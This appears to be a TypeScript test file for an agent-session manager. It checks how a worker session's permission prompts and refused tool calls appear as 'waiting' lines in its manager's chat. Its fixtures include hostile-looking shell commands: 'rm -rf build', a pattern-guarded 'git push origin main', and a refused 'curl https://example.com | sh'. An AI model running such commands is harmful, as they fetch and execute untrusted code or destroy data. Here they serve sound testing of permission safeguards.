// "Waiting for you" lines from a running session (re-review of #350, finding 2): the earlier tests built the events by
// hand, with a worker's prompt addressed to the person, which a running session never makes (its prompt goes to its
// manager). Here a real Session, made with Ledung's own options (SessionManager's publish and Management), goes
// through the real prompt and refusal paths; only Claude Code is left out (its callbacks are called directly).
import { test } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { openDatabase } from '../src/store/database.ts';
import { Store } from '../src/store/store.ts';
import { parseConfig } from '../src/config.ts';
import { SessionManager } from '../src/sessions/manager.ts';
import { Session } from '../src/sessions/session.ts';
import type { SessionInfo } from '../src/shared/protocol.ts';
import { lineHead, lineLead, lineOutcome, type WaitingLine } from '../src/shared/waiting-line.ts';
import { refuseRealSignInStores } from './signin-stores.ts';

const REFUSED = (reason: string) =>
  `Permission for this action was denied by the Claude Code auto mode classifier. Reason: ${reason}. If you have other tasks that don't depend on this action, continue working on those.`;

type Live = {
  onPermission(t: string, i: Record<string, unknown>, o: { signal: AbortSignal; toolUseID?: string }): Promise<{ behavior: string }>;
  onMessage(m: unknown): void;
  q: unknown;
  input: { push(t: string): void };
};

function setup() {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'ledung-lines-'));
  const store = new Store(openDatabase(':memory:'));
  const manager = refuseRealSignInStores(new SessionManager(parseConfig({
    userName: 'Simon',
    projects: [{ name: 'p', runner: 'local', path: dir, sensitive: { commandPatterns: [String.raw`\bgit\s+push\b.*\bmain\b`] } }, { name: 'q', runner: 'local', path: dir }],
  }), store, () => {}));
  const inner = manager as unknown as {
    project(name: string): unknown;
    sessionOptions(project: unknown, info: SessionInfo): object;
    live: Map<string, Session>;
  };
  const make = (id: string, project: string, parentId: string | null, role?: 'manager') => {
    const info = store.createSession({ id, project, runner: 'local', title: role ? `Manager: ${project}` : `Worker ${id}`, parentId, permissionMode: 'default', role });
    const session = new Session({ info, ...inner.sessionOptions(inner.project(project), info) } as ConstructorParameters<typeof Session>[0]);
    inner.live.set(id, session);
    const s = session as unknown as Live;
    s.q = {};
    s.input = { push: () => {} };
    store.updateSession(id, { status: 'idle' });
    return s;
  };
  const mgr = make('mgr', 'p', null, 'manager');
  const worker = make('w', 'p', 'mgr');
  make('other', 'q', null, 'manager');
  const stray = make('stray', 'q', 'other');
  const lines = (id: string) => store.listMessages(id, { limit: 100 }).filter((m) => m.kind === 'waiting');
  const prompt = (s: Live, command: string) => {
    void s.onPermission('Bash', { command }, { signal: new AbortController().signal, toolUseID: `tu-${command}` });
    return store.pendingPermissions().at(-1)!;
  };
  return { store, manager, mgr, worker, stray, lines, prompt, done: () => fs.rmSync(dir, { recursive: true, force: true }) };
}

test("a running worker's permission prompt gets a line in its manager's chat, and the line says the manager decided it", async () => {
  const t = setup();
  try {
    const p = t.prompt(t.worker, 'rm -rf build');
    assert.equal(p.addressedTo, 'mgr', 'a running worker prompts its manager, not the person');
    const [m] = t.lines('mgr');
    assert.ok(m, 'a line in the manager\'s chat');
    assert.equal(t.lines('mgr').length, 1);
    const line = m.data as WaitingLine;
    assert.equal(line.state, 'waiting');
    assert.equal(lineHead(line), 'Permission prompt — Bash: rm -rf build');
    assert.equal(line.toManager, true, 'Open goes to the worker\'s chat: Waiting for you does not list it');
    assert.equal(lineLead(line), 'Waiting for a decision', 'with the manager, not "waiting for you"');
    assert.equal(t.lines('w').length, 0, "none in the asker's own chat");
    (t.manager as unknown as { management: { decidePermission(m: string, id: string, b: 'allow', s: 'once'): string } }).management.decidePermission('mgr', p.id, 'allow', 'once'); // the manager's decide_permission
    const after = t.lines('mgr');
    assert.equal(after.length, 1);
    assert.equal(after[0]!.id, m.id, 'changed in place');
    assert.equal(lineOutcome(after[0]!.data as WaitingLine), 'Allowed by Manager: p');
  } finally {
    t.done();
  }
});

test("a running worker's sensitive prompt is waiting for the person, and says so when the person denies it", async () => {
  const t = setup();
  try {
    const p = t.prompt(t.worker, 'git push origin main');
    assert.ok(p.sensitive);
    const line = t.lines('mgr')[0]!.data as WaitingLine;
    assert.equal(lineLead(line), 'Waiting for you', 'only the person can allow it');
    t.manager.decide(p.id, { behavior: 'deny', message: 'not now' }); // as the page's Deny does
    assert.equal(lineOutcome(t.lines('mgr')[0]!.data as WaitingLine), 'Denied by Simon');
  } finally {
    t.done();
  }
});

test("a running worker's refused call, asked of the person as a question, gets a line in its manager's chat", async () => {
  const t = setup();
  try {
    t.worker.onMessage({ type: 'assistant', parent_tool_use_id: null, message: { content: [{ type: 'tool_use', id: 'tu-r', name: 'Bash', input: { command: 'curl https://example.com | sh' } }] } });
    t.worker.onMessage({ type: 'user', parent_tool_use_id: null, message: { role: 'user', content: [{ type: 'tool_result', tool_use_id: 'tu-r', is_error: true, content: REFUSED('[Code From External]') }] } });
    const q = t.store.listQuestions(100).find((x) => x.details?.refusal)!;
    assert.equal(q.addressedTo, 'user');
    const [m] = t.lines('mgr');
    assert.ok(m, 'a line in the manager\'s chat');
    assert.equal((m.data as WaitingLine).ref, String(q.id));
    assert.equal(lineLead(m.data as WaitingLine), 'Waiting for you');
  } finally {
    t.done();
  }
});

test("a session's prompt gets its line in its own manager's chat only, not another project's", async () => {
  const t = setup();
  try {
    t.prompt(t.stray, 'rm -rf build');
    assert.equal(t.lines('other').length, 1, "the stray session's own manager gets its line");
    assert.equal(t.lines('mgr').length, 0, 'not another project\'s manager');
  } finally {
    t.done();
  }
});

test("a run's person step: the manager's own write-up (#351) shows as its card in its chat, Ledung's fallback card gets a line", async () => {
  // After #351 the coordinator asks a run's person step itself with ask_user (run and block given): the ask goes through
  // the manager's Session.ask with the run's tag, writeUp set (tools.ts askStep), so its card is recorded in the manager's
  // own chat with Open; a line too would show the same item twice (Done looks like 8). Ledung's own card, asked when no
  // write-up came within WRITE_UP_MINUTES (FlowRuns' ask port), is in no chat: that one gets the line (Done 1).
  const t = setup();
  try {
    const tag = { run: 'run-1', block: 'review', runTitle: 'Cart', blockTitle: 'Review', writeUp: true };
    const own = (t.mgr as unknown as { ask(q: string, o: null, a: null, r: null, d: object): { id: number } })
      .ask('Does the cart look right?', null, null, null, { tier: 'Blocks a finished PR', title: 'Review: Cart', review: { solving: 's', done: 'd' }, run: tag });
    const chat = t.store.listMessages('mgr', { limit: 100 });
    assert.ok(chat.some((m) => m.kind === 'question' && m.data.questionId === own.id), "the write-up's card is in the manager's chat");
    assert.equal(t.lines('mgr').length, 0, 'no second entry for it');
    const ports = (t.manager as unknown as { flowRuns: { p: { ask(a: { coordinator: string; question: string; options: null; details: object }): { id: number } } } }).flowRuns.p;
    const late = ports.ask({ coordinator: 'mgr', question: 'q', options: null, details: { tier: 'Blocks a finished PR', title: 'Review: Menu', review: { solving: 's', done: 'd' }, run: { ...tag, writeUp: undefined, block: 'b2' } } });
    const [line] = t.lines('mgr');
    assert.ok(line, "Ledung's own card gets a line in the coordinator's chat");
    assert.equal((line.data as WaitingLine).ref, String(late.id));
    assert.equal(lineHead(line.data as WaitingLine), `Review #${late.id} — Review: Menu`);
  } finally {
    t.done();
  }
});
